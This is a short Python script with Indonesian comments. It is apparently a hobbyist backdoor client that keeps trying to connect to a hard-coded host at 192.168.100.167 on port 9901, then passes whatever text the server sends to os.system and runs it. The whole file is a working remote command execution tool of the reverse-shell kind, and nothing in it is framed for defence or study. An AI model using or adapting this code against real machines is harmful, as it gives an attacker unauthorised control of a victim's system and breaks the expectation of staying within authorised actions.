#/usr/bin/python3

import socket # import soket
import os # yup, intinya

soket=socket.socket() # membuat objek soket
host='192.168.100.167' # bisa dialokasikan
port=9901 # bisa dialokasikan
terhubung=False
while not terhubung: # klien menunggu koneksi dari peladen
	try:
		koneksi=soket.connect((host,port)) # mencoba terhubung ke host dan port
		terhubung=True
		print("pemicu ditekan !..") # biar keren ;)
		aa = os.system("{}".format(soket.recv(1024).decode())) # medengarkan perintah dari peladen
		soket.close()
	except Exception as e:
		pass